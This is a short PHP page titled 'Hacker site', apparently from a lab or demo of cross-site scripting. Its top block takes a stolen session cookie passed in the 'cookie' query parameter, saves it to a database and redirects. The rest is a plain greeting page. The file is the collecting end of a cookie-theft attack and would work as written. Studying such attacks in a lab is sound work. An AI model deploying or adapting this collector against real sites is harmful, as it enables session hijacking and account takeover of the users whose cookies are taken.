<?php
    if(isset($_GET["cookie"])){
        include("connect.php");
        $db = new Connect();
        $db->insertCookie($_GET["cookie"]);
        header("Location: hacker.php");
        //echo $_GET["cookie"];s
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker site</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <h1>Hello my friend</h1>
    <a href="index.php">GO HOME</a>
</body>
</html>